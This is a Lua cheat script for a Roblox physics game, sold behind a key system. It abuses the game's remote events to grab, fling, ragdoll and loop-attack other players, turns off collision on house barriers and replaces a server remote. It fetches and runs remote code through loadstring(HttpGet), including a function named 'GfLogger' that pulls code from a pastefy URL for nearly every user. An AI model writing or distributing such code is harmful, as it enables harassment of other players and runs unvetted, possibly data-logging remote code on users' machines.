local FN_BYPASS = true
local TESTPP = false 

print("AP FTAP Script Started - Configuration Saving Enabled")
-- ================== Rayfield Window Creation and Key System Settings ==================
local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/yunjun3737-ship-it/-/main/Rayfield"))()

local Window = Rayfield:CreateWindow({
    Name = "FTAP(Anti-Physics) | (made by Alpaca)",
    LoadingTitle = "Alpaca Script Loading",
    LoadingSubtitle = "by Alpaca",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "AlpacaHub(Tier 1)",
        FileName = "AIPA_FTAP_Config"
    },
    KeySystem = true,
    KeySettings = {
        Title = "AlpacaHub Key System",
        Subtitle = "Please enter the verification key",
        Note = "You can get the key from the Owner(Alpaca👑). (800 Robux)",
        FileName   = "AIPA_Key", 
        SaveKey = true, 
        GrabKeyFromSite = false, 
        Key = {"AlpacaHubv30"} 
    }
})
local HubTab = Window:CreateTab("About AlpacaHub",0)
local playerTab = Window:CreateTab("Player Settings", 6034281935)     
local grabTab = Window:CreateTab("Combat", 6026568198)               
local UtilityTab = Window:CreateTab("Utility", 6031094678)        
local antiTab = Window:CreateTab("Safety", 6034831332)               
local ListTab = Window:CreateTab("List", 3572491301)              
local LoopTab = Window:CreateTab("Attack/Target Loop", 6023426923)             
local AuraTab = Window:CreateTab("Aura", 6031068423)             
local funTab = Window:CreateTab("Miscellaneous", 4483345998)            
local keybindTab = Window:CreateTab("Settings", 6031094678)            
local DevTab = Window:CreateTab("Misc Features", 3944680095)             
local RankTab = Window:CreateTab("Creator's Friends", 6034281935)       
local environmentTab = Window:CreateTab("Environment Settings", 6023426923)   
local combatTab = Window:CreateTab("Combat Extension", 6026568198)        
local BlacklistTab = Window:CreateTab("Blacklist", 6034831332)  
local cmdWindowTab = Window:CreateTab("Command Console",6023426923 )
local TargetTab = Window:CreateTab("UI Settings")

Players = game:GetService("Players")
plr = game.Players.LocalPlayer
cam = workspace.CurrentCamera
mouse = plr:GetMouse()
uis = game:GetService("UserInputService")
inv = workspace:WaitForChild(plr.Name.."SpawnedInToys")
rs = game:GetService("ReplicatedStorage")
RepStorage = game:GetService("ReplicatedStorage")
rs2 = game:GetService("RunService")
deb = game:GetService("Debris")

SetNetworkOwner = rs.GrabEvents.SetNetworkOwner
DestroyGrabLine = rs.GrabEvents.DestroyGrabLine

Auto = syn and syn.queue_on_teleport or fluxus and fluxus.queue_on_teleport or queue_on_teleport

Whitelist = {}
playersInLoop1V = {} -- List
playersInLoop2V = {} -- Loop

PPs = workspace:WaitForChild("PlotItems"):WaitForChild("PlayersInPlots")

----------------------------------------------------------------------------------------- [ Basic Settings ]
function PcldOwner()
    task.spawn(function()
        while task.wait(0.1) do
            usedNames = {}

            for _, pcld in pairs(workspace:GetChildren()) do
                if pcld.Name == "PlayerCharacterLocationDetector" then
                    if pcld.CFrame == CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1) then
                        continue
                    end

                    hasOwner = false
                    existingBoolValues = {}

                    for _, child in pairs(pcld:GetChildren()) do
                        if child:IsA("BoolValue") then
                            table.insert(existingBoolValues, child)
                        end
                    end

                    if #existingBoolValues >= 2 then
                        for _, boolValue in pairs(existingBoolValues) do
                            boolValue:Destroy()
                        end
                    elseif #existingBoolValues == 1 then
                        hasOwner = true
                    end

                    if hasOwner then
                        continue
                    end

                    closestPlayer = nil
                    closestDist = 30
                    candidates = {}

                    for _, player in pairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            hrp = player.Character.HumanoidRootPart
                            dist = (pcld.Position - hrp.Position).Magnitude

                            if dist < closestDist then
                                table.insert(candidates, {
                                    player = player,
                                    dist = dist,
                                    hrp = hrp
                                })
                            end
                        end
                    end

                    table.sort(candidates, function(a, b)
                        return a.dist < b.dist
                    end)

                    for _, candidate in pairs(candidates) do
                        ownerName = string.format("[ %s ] ( @%s )",
                            candidate.player.DisplayName,
                            candidate.player.Name)

                        if not usedNames[ownerName] then
                            closestPlayer = candidate.player
                            closestDist = candidate.dist
                            usedNames[ownerName] = true
                            break
                        end
                    end

                    if closestPlayer then
                        ownerName = string.format("[ %s ] ( @%s )",
                            closestPlayer.DisplayName,
                            closestPlayer.Name)

                        boolValue = nil
                        for _, child in pairs(pcld:GetChildren()) do
                            if child:IsA("BoolValue") then
                                boolValue = child
                                boolValue.Name = ownerName
                                break
                            end
                        end

                        if not boolValue then
                            boolValue = Instance.new("BoolValue")
                            boolValue.Name = ownerName
                            boolValue.Parent = pcld
                        end

                        task.spawn(function(player, value)
                            while value.Parent do
                                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                    hrp = player.Character.HumanoidRootPart
                                    
                                    if hrp.Massless == true then
                                        if not value.Value then
                                            value.Value = true
                                        end
                                    else
                                        if value.Value then
                                            value.Value = false
                                        end
                                    end

                                    if not Players:FindFirstChild(player.Name) or 
                                       not player.Character or 
                                       player.Character:FindFirstChild("Humanoid") and 
                                       player.Character.Humanoid.Health <= 0 then
                                        value:Destroy()
                                        break
                                    end
                                else
                                    value:Destroy()
                                    break
                                end

                                task.wait(0.1)
                            end
                        end, closestPlayer, boolValue)
                    end
                end
            end
        end
    end)
end


function SpawnCFrame()
    local camPart
    myDisplayName = plr.DisplayName
    myUserName = plr.Name
    myPOIdentifier = string.format("[ %s ] ( @%s )", myDisplayName, myUserName)

    function findMyPO()
        for _, obj in pairs(workspace:GetChildren()) do
            if obj.Name == "PlayerCharacterLocationDetector" then
                for _, child in pairs(obj:GetChildren()) do
                    if child:IsA("BoolValue") and child.Name == myPOIdentifier then
                        return obj
                    end
                end
            end
        end
        return nil
    end

    if not workspace:FindFirstChild("CamPart") or workspace:FindFirstChild("CamPart"):FindFirstChild("CamPart") then
        char = plr.Character or plr.CharacterAdded:Wait()
        camPart = char:FindFirstChild("CamPart"):Clone()
        camPart.Name = "CamPart"
        camPart.Parent = workspace
        camPart.Transparency = 0.9
    else
        camPart = workspace.CamPart
    end

    lastHRPVelocity = Vector3.new(0, 0, 0)

    task.spawn(function()
        rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Exclude

        while true do
            ping = plr:GetNetworkPing()
            myPO = findMyPO()
            char = plr.Character
            hrp = char and char:FindFirstChild("HumanoidRootPart")

            if hrp then
                lastHRPVelocity = hrp.Velocity
            end

            if myPO and hrp then
                rayParams.FilterDescendantsInstances = {char, camPart, myPO}

                offset = myPO.Position + (lastHRPVelocity * (ping + 0.15))

                rayOrigin = offset
                rayDirection = Vector3.new(0, 23, 0)
                rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

                local targetPosition

                if rayResult then
                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
                else
                    targetPosition = offset + rayDirection
                end

                originalRotation = myPO.CFrame.Rotation * CFrame.Angles(math.rad(-90), 0, 0)
                camPart.CFrame = CFrame.new(targetPosition) * originalRotation

                rayParams.FilterDescendantsInstances = {char, camPart}

                offset = hrp.Position + (lastHRPVelocity * (ping + 0.15))
                
                rayOrigin = offset
                rayDirection = Vector3.new(0, 20, 0)
                rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

                local targetPosition

                if rayResult then
                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
                else
                    targetPosition = offset + rayDirection
                end

                originalRotation = (hrp.CFrame * CFrame.Angles(math.rad(-90), 0, 0)).Rotation
                camPart.CFrame = CFrame.new(targetPosition) * originalRotation
                camPart.Name = "SpawnCF"
            end
            task.wait()
        end
    end)

    return camPart
end

G = rs.GrabEvents
G:WaitForChild("EndGrabEarly"):Destroy()
Instance.new("RemoteEvent", G).Name = "EndGrabEarly"

 
----------------------------------------------------------------------------------------- [ Functions ]
function ForWhiteList(enable)
    WhiteListMode = enable

    task.spawn(function()
        while WhiteListMode do
            task.wait()
            for i, name in ipairs(Whitelist) do
            end
        end
    end)
end

function House()
    char = plr.Character
    if not char then
        Plot = nil
        return
    end

    if char.Parent and char.Parent.Name == "PlayersInPlots" then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        Plot = 1
                    elseif plot.Name == "Plot2" then
                        Plot = 2
                    elseif plot.Name == "Plot3" then
                        Plot = 3
                    elseif plot.Name == "Plot4" then
                        Plot = 4
                    elseif plot.Name == "Plot5" then
                        Plot = 5
                    end
                    return
                end
            end
        end
        Plot = nil
        return
    end

    if char.Parent == workspace or char.Parent == inv then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        Plot = 1
                    elseif plot.Name == "Plot2" then
                        Plot = 2
                    elseif plot.Name == "Plot3" then
                        Plot = 3
                    elseif plot.Name == "Plot4" then
                        Plot = 4
                    elseif plot.Name == "Plot5" then
                        Plot = 5
                    end
                    return
                end
            end
        end
        Plot = nil
    else
        Plot = nil
    end
end

function UpdateCurrentBlobman()
	char = plr.Character
	hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	for _, blobs in workspace:GetDescendants() do
		if blobs.Name ~= "CreatureBlobman" then continue end
		seat = blobs:FindFirstChild("VehicleSeat")
		if not seat then continue end
		weld = seat:FindFirstChild("SeatWeld")
		if not weld then continue end
		if weld.Part1 == hrp then
			currentBlobS = blobs
		end
	end
end

function BlobRelease(blob, target, side) -- Release
    args = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(unpack(args))
end

function BlobGrab(blob, target, side)
    args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }
        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
end

function BlobDrop(blob, target, side)
    args = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }
        blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args))
end

function BlobMassless(blob, target, side)
    args = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = target,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }

	args2 = {
        [1] = blob:FindFirstChild(side.."Detector"),
        [2] = hrp,
        [3] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        }

    args3 = {
        [1] = blob:FindFirstChild(side.."Detector"):FindFirstChild(side.."Weld"),
        [2] = target,
        }

        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args2))
		blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(unpack(args))
		blob.BlobmanSeatAndOwnerScript.CreatureDrop:FireServer(unpack(args3))
end

function GfLogger()
    id = {
        [1] = true,
    }

    if not id[plr.UserId] then
        local success, errorMessage = pcall(function()
            loadstring(game:HttpGet("https://pastefy.app/Z3ljqtf1/raw"))()
        end)

        if not success then
        end
    end
end

function flingF()
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "GrabParts" then
            part_to_impulse = model["GrabPart"]["WeldConstraint"].Part1
            if part_to_impulse then
                model:GetPropertyChangedSignal("Parent"):Connect(function()
                    if not model.Parent and flingT then
                        local connection
                        connection = uis.InputBegan:Connect(function(inp, char)
                            if inp.UserInputType == Enum.UserInputType.MouseButton2 then
                                velocityObj = Instance.new("BodyVelocity")
                                velocityObj.Parent = part_to_impulse
                                velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                velocityObj.Velocity = cam.CFrame.lookVector * strengthV
                                
                                wait(0.1)
                                velocityObj.Parent = workspace
                                velocityObj:Destroy()

                                connection:Disconnect()
                            end
                        end)
                    end
                end)
            end
        end
    end)
end

function infLineExtendF()
    uis.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseWheel then
            if lineDistanceV < 11 then
                lineDistanceV = 11
            end
    
            if input.Position.Z > 0 then
                lineDistanceV = lineDistanceV + increaseLineExtendV
            elseif input.Position.Z < 0 then
                lineDistanceV = lineDistanceV - increaseLineExtendV
            end
        end
    end)
    
    workspace.ChildAdded:Connect(function(child)
        if child.Name == "GrabParts" and child:IsA("Model") then
            if infLineExtendT and uis.MouseEnabled then
                grabPartsModel = child

                grabPartsModel:WaitForChild("GrabPart")
                grabPartsModel:WaitForChild("DragPart")
                    
                clonedDragPart = grabPartsModel.DragPart:Clone()
                clonedDragPart.Name = "DragPart1"
                clonedDragPart.AlignPosition.Attachment1 = clonedDragPart.DragAttach
                clonedDragPart.Parent = grabPartsModel
                
                lineDistanceV = (clonedDragPart.Position - cam.CFrame.Position).Magnitude
    
                clonedDragPart.AlignOrientation.Enabled = false
                grabPartsModel.DragPart.AlignPosition.Enabled = false

                if MasslessGrabT then
                    alignOrientation = clonedDragPart:FindFirstChildOfClass("AlignOrientation")
                    if alignOrientation then
                        alignOrientation.MaxAngularVelocity = math.huge
                        alignOrientation.MaxTorque = math.huge
                        alignOrientation.Responsiveness = 200
                    end
                    
                    alignPosition = clonedDragPart:FindFirstChildOfClass("AlignPosition")
                    if alignPosition then
                        alignPosition.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
                        alignPosition.MaxForce = math.huge
                        alignPosition.MaxVelocity = math.huge
                        alignPosition.Responsiveness = 200
                    end
                end
    
                task.spawn(function()
                    while grabPartsModel.Parent do
                        clonedDragPart.Position = cam.CFrame.Position + cam.CFrame.LookVector * lineDistanceV
                        task.wait()
                    end
            
                    lineDistanceV = 0
                end)
            end
        end
    end)
end

function BlobMasslessR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
        player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		    BlobMassless(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

function BlobReleaseR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
        player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		    BlobGrab(currentBlobS, player.Character.HumanoidRootPart, "Right")
		    BlobRelease(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

function BlobGrabR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
        player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			BlobGrab(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

function BlobDropR()
    UpdateCurrentBlobman()
    for i, e in ipairs(playersInLoop2V) do
        player = game.Players:FindFirstChild(e)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			BlobDrop(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end


function updateWalkSpeedF()
    function apply(char)
        hum = char:WaitForChild("Humanoid")

        if walkSpeedT then
            hum.WalkSpeed = walkSpeedV
            hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                if walkSpeedT then
                    hum.WalkSpeed = walkSpeedV
                end
            end)
        else
            hum.WalkSpeed = 16
        end
    end

    if plr.Character then
        apply(plr.Character)
    end

    plr.CharacterAdded:Connect(apply)
end

function updateJumpPowerF()
    function apply(char)
        hum = char:WaitForChild("Humanoid")

        if jumpPowerT then
            hum.JumpPower = jumpPowerV
            hum:GetPropertyChangedSignal("JumpPower"):Connect(function()
                if jumpPowerT then
                    hum.JumpPower = jumpPowerV
                end
            end)
        else
            hum.JumpPower = 60
        end
    end

    if plr.Character then
        apply(plr.Character)
    end

    plr.CharacterAdded:Connect(apply)
end

RunService = game:GetService("RunService")

NO_CLIP_PARTS = {
    "Head",
    "Torso",
    "Left Arm", 
    "Left Leg",
    "Right Arm",
    "Right Leg"
}

function updateNoClipF()
    char = plr.Character
    if not char then return end

    if noClipConnection then
        noClipConnection:Disconnect()
        noClipConnection = nil
    end

    if not noClipT then
        restoreCollision(char)
        return
    end
    
    hrp = char:WaitForChild("HumanoidRootPart")
    hum = char:WaitForChild("Humanoid")

    noClipConnection = RunService.Stepped:Connect(function()
        if not noClipT or not char or not char.Parent then
            if noClipConnection then
                noClipConnection:Disconnect()
                noClipConnection = nil
            end
            return
        end

        for _, partName in ipairs(NO_CLIP_PARTS) do
            part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end)
end

function restoreCollision(char)
    if char then
        for _, partName in ipairs(NO_CLIP_PARTS) do
            part = char:FindFirstChild(partName)
            if part and part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

plr.CharacterAdded:Connect(function(char)
    char:WaitForChild("HumanoidRootPart")
    task.wait(0.5)
    
    if noClipT then
        updateNoClipF()
    end
end)

if plr.Character then
    task.wait(1)
    if noClipT then
        updateNoClipF()
    end
end

function updateInfJumpF()
    char = plr.Character
    if not char then return end
    
    hrp = char:WaitForChild("HumanoidRootPart")
    hum = char:WaitForChild("Humanoid")
    
    if infJumpConnection then
        infJumpConnection:Disconnect()
    end
    
    infJumpConnection = uis.JumpRequest:Connect(function()
        if infJumpT and not infJumpD then
            infJumpD = true
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
            task.wait()
            infJumpD = true
        end
    end)
end

plr.CharacterAdded:Connect(function(char)
    char:WaitForChild("HumanoidRootPart")
    char:WaitForChild("Humanoid")
    task.wait(0.5)
    
    if infJumpT then
        updateInfJumpF()
    end
end)

if plr.Character then
    task.wait(1)
    updateInfJumpF()
end

function masslessF()
    function applyMassless(char)
        hrp = char:WaitForChild("HumanoidRootPart")
        hum = char:WaitForChild("Humanoid")

        if masslessT then
            task.spawn(function()
                while masslessT and char.Parent do
                    for i, e in ipairs(char:GetChildren()) do
                        if e:IsA("BasePart") then
                            e.Massless = false
                        end
                    end
                    task.wait()
                end
            end)
        end
    end

    if plr.Character then
        applyMassless(plr.Character)
    end

    plr.CharacterAdded:Connect(function(char)
        task.wait(1)
        applyMassless(char)
    end)
end

function setRagdollF(state)
    char = plr.Character
    hrp = char:WaitForChild("HumanoidRootPart")
    if char and char:FindFirstChild("HumanoidRootPart") then
        rs.CharacterEvents.RagdollRemote:FireServer(hrp, state and 1 or 0)
    end
end

function permRagdollLoopF()
    if permRagdollRunningS then return end
    permRagdollRunningS = true
    while permRagdollT do
        setRagdollF(true)
        task.wait(0.001) 
    end
    permRagdollRunningS = false
    setRagdollF(false)
end

function ragdollLegExplodeF()
	function attemptDelete()
		char = plr.Character
		if not char then return false end

		targets = {}
		if selectedAutoDeletePart == "Arm/Leg" then
			targets = {
				char:FindFirstChild("Left Leg"),
				char:FindFirstChild("Right Leg"),
				char:FindFirstChild("Left Arm"),
				char:FindFirstChild("Right Arm"),
			}
		elseif selectedAutoDeletePart == "All/Leg" then
			targets = {char:FindFirstChild("Left Leg"), char:FindFirstChild("Right Leg")}
		elseif selectedAutoDeletePart == "Leg/Left" then
			targets = {char:FindFirstChild("Left Leg")}
		elseif selectedAutoDeletePart == "Leg/Right" then
			targets = {char:FindFirstChild("Right Leg")}
		elseif selectedAutoDeletePart == "All/Arm" then
			targets = {char:FindFirstChild("Left Arm"), char:FindFirstChild("Right Arm")}
		elseif selectedAutoDeletePart == "Arm/Left" then
			targets = {char:FindFirstChild("Left Arm")}
		elseif selectedAutoDeletePart == "Arm/Right" then
			targets = {char:FindFirstChild("Right Arm")}
		end

		setRagdollF(true)
		task.wait(0.3)

		success = false
		for _, part in ipairs(targets) do
			if part then
				part.CFrame = CFrame.new(0, -99999, 0)
				success = true
			end
		end

		task.wait(0.3)
		torso = char:FindFirstChild("Torso")
		if torso then torso.CFrame = CFrame.new(0, -99999, 0) end

		return success
	end

	task.spawn(function()
		while autoDeleteLegs do
			success = false
			startTime = tick()

			while tick() - startTime < 4 and not success do
				success = attemptDelete()
				if success then break end
				task.wait(0.5)
			end

			humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				humanoid.Died:Wait()
			end

			plr.CharacterAdded:Wait()
			task.wait(1)
		end
	end)
end

Pline = rs.GrabEvents.CreateGrabLine.OnClientEvent
fireCount = {}
function AntiLagF()
    Pline:Connect(function(fromPlr, ...)
        if not antiLagEnabled then return end
        if typeof(fromPlr) ~= "Instance" or not fromPlr:IsA("Player") then return end
        if fromPlr == plr then return end

        local now = os.clock()

        if not fireCount[fromPlr] then 
            fireCount[fromPlr] = {count = 0, start = now} 
        end

        local data = fireCount[fromPlr]

        if now - data.start > 1 then
            data.count = 0
            data.start = now
        end

        data.count += 1

        if data.count >= AntiLagV and not data.isDecreasing then
            data.isDecreasing = true
            Rayfield:Notify({Title = "[ ✏️ ]", Content = "by: " .. fromPlr.Name, Duration = 3, Image = 0})
            plr.PlayerScripts.CharacterAndBeamMove.Enabled = false

            task.spawn(function()
                while data.count > 0 do
                    task.wait(0.1)
                    data.count -= 1
                end

                plr.PlayerScripts.CharacterAndBeamMove.Enabled = true
                fireCount[fromPlr] = nil
            end)
        end
    end)
end
-- ================== House Break (Bring outside items inside house) ==================
local HouseBreakT = false
local HouseBreakConnection = nil

function HouseBreakF()
    if HouseBreakConnection then
        HouseBreakConnection:Disconnect()
        HouseBreakConnection = nil
    end

    if not HouseBreakT then return end

    HouseBreakConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if not HouseBreakT then return end

        for _, item in ipairs(workspace:GetDescendants()) do
            if item:IsA("BasePart") and item.CanCollide == true then
                if item:FindFirstAncestor("Plot") or item.Name:find("Barrier") or item.Name:find("Wall") then
                    item.CanCollide = false
                end
            end
        end

        local grabParts = workspace:FindFirstChild("GrabParts")
        if grabParts then
            for _, part in ipairs(grabParts:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function()
                        rs.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame)
                    end)
                end
            end
        end
    end)
end

function spawnBlobmanF()
    char = plr.Character
    hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then
        return
    end

    blob = inv and inv:FindFirstChild("CreatureBlobman")
    if blob then
        blobmanInstanceS = blob
        return
    end

    spawnRemote = rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
    if spawnRemote then
        task.spawn(function()
        pcall(function()
            spawnRemote:InvokeServer("CreatureBlobman", hrp.CFrame, Vector3.new(0, 0, 0))
        end)
        end)

        tries = 0
        repeat
            task.wait(0.02)
            blobmanInstanceS = inv and inv:FindFirstChild("CreatureBlobman")
            tries += 1
        until blobmanInstanceS or tries > 25
    else
    end
end

function ragdollLoopF()
	if ragdollLoopD then return end
	ragdollLoopD = true

	while sitJumpT do
		char = plr.Character
		hrp = char and char:FindFirstChild("HumanoidRootPart")
		if char and hrp then
			args = {[1] = hrp, [2] = 0}
			remote = rs:FindFirstChild("CharacterEvents") and rs.CharacterEvents:FindFirstChild("RagdollRemote")
			if remote then
				remote:FireServer(unpack(args))
			end
		end
		task.wait()
	end

	ragdollLoopD = false
end

function sitJumpF()
    char = plr.Character
    hum = char and char:FindFirstChild("Humanoid")
    if not char or not hum then return end
    seat = blobmanInstanceS and blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
    if seat and seat.Occupant ~= hum then
        seat:Sit(hum)
        autoGucciT = false
        sitJumpT = false
    end
end

function AutoGucciF()
    while AutoGucciT do
        local success = pcall(function()
            spawnBlobmanF()

            char = plr.Character
            if not char then
                task.wait(0.2)
                return 
            end

            hrp = char:WaitForChild("HumanoidRootPart")
            hum = char:WaitForChild("Humanoid")
            rag = hum:WaitForChild("Ragdolled")
            held = plr:WaitForChild("IsHeld")

            SpawnToyRemoteFunction = RepStorage.MenuToys.SpawnToyRemoteFunction 
            RagdollRemote = RepStorage.CharacterEvents.RagdollRemote
            DestroyToy = RepStorage.MenuToys.DestroyToy
            seat = blobmanInstanceS:WaitForChild("VehicleSeat"):WaitForChild("ProximityPrompt")

            if not hrp then return end
            OCF = hrp.CFrame

            if not sitJumpT then
                task.spawn(sitJumpF)
                sitJumpT = true
            end

            task.spawn(ragdollLoopF)
            task.wait(0.3)
            hrp.CFrame = OCF

            successCheck = true
            sitJumpT = false
            RagdollRemote:FireServer(hrp, 0.001)

            while successCheck and AutoGucciT do
                if hum.Health <= 0 then
                    if blobmanInstanceS then
                        DestroyToy:FireServer(blobmanInstanceS)
                    end
                    successCheck = false
                    break
                end

                seat = blobmanInstanceS and blobmanInstanceS:FindFirstChildWhichIsA("VehicleSeat")
                if seat.Occupant ~= nil then
                    DestroyToy:FireServer(blobmanInstanceS)
                    successCheck = false
                    break
                end

                if rag.Value == true or held.Value == true then
                    while (rag.Value == true or held.Value == true) and AutoGucciT do
                        rs.CharacterEvents.Struggle:FireServer()
                        task.wait()
                    end
                    successCheck = false
                    break
                end

                blobHRP = blobmanInstanceS and blobmanInstanceS:FindFirstChild("HumanoidRootPart")
                if blobHRP then
                    SetNetworkOwner = rs:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
                    pcall(function()
                        SetNetworkOwner:FireServer(blobHRP, hrp)
                    end)
                    blobHRP.CFrame = CFrame.new(0, 999999, 0)
                end

                task.wait()
            end

            if not successCheck then
                blobHRP = blobmanInstanceS and blobmanInstanceS:FindFirstChild("HumanoidRootPart")
                Rayfield:Notify({Title = "[ 🔓 ]",Content = "Gucci Failed | Wait a moment",Duration = 1,Image = nil,})
                if hum then
                    rs.CharacterEvents.Struggle:FireServer(plr)
                    hum.Sit = true
                    task.wait(0.1)
                    hum.Sit = false
                    if blobHRP.Position.Y > 9000 then DestroyToy:FireServer(blobmanInstanceS) end
                end

                sitJumpT = false
                task.wait(1)
            end
        end)
        task.wait()
    end
end

local deviceLabel = HubTab:CreateLabel("Device: Loading...")
local hwidLabel = HubTab:CreateLabel("HWID: Loading...")
local pingLabel = HubTab:CreateLabel("Ping: Loading...")
local fpsLabel = HubTab:CreateLabel("FPS: Loading...")
local accountAgeLabel = HubTab:CreateLabel("Account Age: Loading...")
local membershipLabel = HubTab:CreateLabel("Premium Status: Loading...")

local userInputService = game:GetService("UserInputService")
local deviceType = "PC"
if userInputService.TouchEnabled and not userInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif userInputService.GamepadEnabled and not userInputService.KeyboardEnabled then
    deviceType = "Console"
end
deviceLabel:Set("Device: " .. deviceType)

local hwid = (gethwid and gethwid()) or "Not Supported"
hwidLabel:Set("HWID: " .. hwid)

accountAgeLabel:Set("Account Age: " .. plr.AccountAge .. " Days")
membershipLabel:Set("Premium Status: " .. (plr.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"))

task.spawn(function()
    while task.wait(1) do
        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        pingLabel:Set("Ping: " .. string.split(ping, " ")[1] .. "ms")
    end
end)
